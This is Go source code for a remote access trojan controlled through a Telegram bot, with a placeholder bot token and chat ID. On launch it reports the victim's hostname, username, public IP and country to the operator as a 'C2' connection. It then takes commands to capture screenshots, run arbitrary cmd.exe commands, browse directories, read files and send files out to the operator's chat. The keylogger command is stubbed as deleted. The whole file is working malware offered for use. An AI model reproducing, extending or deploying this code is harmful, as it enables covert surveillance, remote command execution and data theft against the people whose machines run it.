package main

import (
	"bytes"
	"fmt"
	"github.com/go-telegram-bot-api/telegram-bot-api"
	emoji "github.com/jayco/go-emoji-flag"
	"github.com/kbinani/screenshot"
	"image/png"
	"io"
	"net/http"
	"os"
	"os/exec"
	"strings"
	"unicode/utf8"
)

func main() {

	bot, _ := tgbotapi.NewBotAPI("XXXX") //Telegram BOT api key

	chatID := int64(12345678) //Your telegram chat ID

	updateConfig := tgbotapi.NewUpdate(0)
	updateConfig.Timeout = 60

	updates, _ := bot.GetUpdatesChan(updateConfig)

	hello := sayHello()
	msg := tgbotapi.NewMessage(chatID, hello)
	_, _ = bot.Send(msg)

	for {

		for update := range updates {

			if update.Message == nil {
				continue
			}

			if update.Message.IsCommand() {
				switch update.Message.Command() {
				case "screenshot":
					imgs, _ := takeScreenshot()

					for i, img := range imgs {
						photo := tgbotapi.NewPhotoUpload(chatID, tgbotapi.FileBytes{
							Name:  fmt.Sprintf("screenshot%d.png", i+1),
							Bytes: img,
						})
						_, _ = bot.Send(photo)
					}

				case "execute":
					cmd := exec.Command("cmd.exe", "/c "+update.Message.CommandArguments())
					output, _ := cmd.CombinedOutput()
					messages := splitMessage(fix(string(output)))
					for _, message := range messages {
						msg := tgbotapi.NewMessage(chatID, message)
						_, _ = bot.Send(msg)
					}

				case "keylogger":
					//deleted

				case "file":
					files := listDir(update.Message.CommandArguments())
					msg := tgbotapi.NewMessage(chatID, files)
					keyboard := tgbotapi.NewInlineKeyboardMarkup(
						tgbotapi.NewInlineKeyboardRow(
							tgbotapi.NewInlineKeyboardButtonData("Previous directory", ".."),
							tgbotapi.NewInlineKeyboardButtonData("Exit", "exit"),
						),
					)
					msg.ReplyMarkup = keyboard
					message, _ := bot.Send(msg)
					messageID := message.MessageID

					done := make(chan bool)

					go func() {
						for {
							select {
							case <-done:
								return
							default:
								update = <-updates
								if update.Message != nil {
									commandArgs := update.Message.Command()
									dir, _ := os.Getwd()
									os.Chdir(dir + "/" + commandArgs)
								}
							}

							if update.CallbackQuery != nil {
								callbackData := update.CallbackQuery.Data
								if callbackData == "exit" {
									done <- true
									return
								}

								if callbackData == ".." {
									os.Chdir("..")
								}
							}

							newDir, _ := os.Getwd()
							files := listDir(newDir)
							_, _ = bot.DeleteMessage(tgbotapi.DeleteMessageConfig{
								ChatID:    chatID,
								MessageID: messageID,
							})
							msg := tgbotapi.NewMessage(chatID, files)
							msg.ReplyMarkup = keyboard
							message, _ = bot.Send(msg)
							messageID = message.MessageID
						}
					}()

					<-done

					msg = tgbotapi.NewMessage(chatID, "Exiting file explorer...")
					_, _ = bot.Send(msg)

				case "download":
					sendFile(bot, chatID, update.Message.CommandArguments())

				case "cat":
					content := readFile(update.Message.CommandArguments())
					messages := splitMessage(content)
					for _, message := range messages {
						msg := tgbotapi.NewMessage(chatID, message)
						_, _ = bot.Send(msg)
					}

				case "kill":
					os.Exit(0)
				}
			}
		}
	}
}

func takeScreenshot() ([][]byte, error) {
	n := screenshot.NumActiveDisplays()

	var screenshots [][]byte

	if n > 0 {
		for i := 0; i < n; i++ {
			bounds := screenshot.GetDisplayBounds(i)
			img, err := screenshot.CaptureRect(bounds)
			if err != nil {
				return nil, err
			}

			var buf bytes.Buffer
			err = png.Encode(&buf, img)
			if err != nil {
				return nil, err
			}

			screenshots = append(screenshots, buf.Bytes())
		}
	} else {
		bounds := screenshot.GetDisplayBounds(0)
		img, err := screenshot.CaptureRect(bounds)
		if err != nil {
			return nil, err
		}

		var buf bytes.Buffer
		err = png.Encode(&buf, img)
		if err != nil {
			return nil, err
		}

		screenshots = append(screenshots, buf.Bytes())
	}

	return screenshots, nil
}

func sayHello() string {
	hostname, _ := os.Hostname()
	username := os.Getenv("USERPROFILE")
	lastIndex := strings.LastIndex(username, "\\")
	if lastIndex != -1 {
		username = username[lastIndex+1:]
	}
	response, _ := http.Get("https://ipinfo.io/ip")
	ip, _ := io.ReadAll(response.Body)
	response2, _ := http.Get("https://ipinfo.io/country")
	country, _ := io.ReadAll(response2.Body)
	countryCode := strings.TrimSpace(strings.TrimRight(string(country), "\n"))
	flag := emoji.GetFlag(countryCode)

	message := "BOOM! Connection received on your C2!\nHostname: " + hostname + "\nUsername: " + username + "\nIP: " + string(ip) + "\nCountry: " + countryCode + " " + flag
	return message
}

func fix(input string) string {
	validUTF8 := make([]rune, 0, len(input))
	for _, r := range input {
		if utf8.ValidRune(r) {
			validUTF8 = append(validUTF8, r)
		}
	}

	return string(validUTF8)
}

func splitMessage(input string) []string {
	const maxMessageLength = 4096
	var messages []string
	for len(input) > maxMessageLength {
		messages = append(messages, input[:maxMessageLength])
		input = input[maxMessageLength:]
	}
	messages = append(messages, input)
	return messages
}

func listDir(dir string) string {
	var files string
	if len(dir) > 0 {
		dirs, _ := os.ReadDir(dir)
		files += "Listing " + dir + ":\n"
		for _, d := range dirs {
			if d.IsDir() {
				files += "📁 /" + d.Name() + "\n"
			} else {
				files += "📄 " + d.Name() + "\n"
			}
		}
	} else {
		currentDir, _ := os.Getwd()
		dirs, _ := os.ReadDir(currentDir)
		files += "Listing current directory:\n"
		for _, d := range dirs {
			if d.IsDir() {
				files += "📁 /" + d.Name() + "\n"
			} else {
				files += "📄 " + d.Name() + "\n"
			}
		}
	}
	return files
}

func readFile(filename string) string {
	content, _ := os.ReadFile(filename)
	return string(content)
}

func sendFile(bot *tgbotapi.BotAPI, chatID int64, filePath string) {
	file, _ := os.Open(filePath)

	fileInfo, _ := file.Stat()

	doc := tgbotapi.NewDocumentUpload(chatID, tgbotapi.FileBytes{
		Name:  fileInfo.Name(),
		Bytes: getFileBytes(file),
	})

	_, _ = bot.Send(doc)
}

func getFileBytes(file *os.File) []byte {
	var buf bytes.Buffer
	_, _ = buf.ReadFrom(file)
	return buf.Bytes()
}
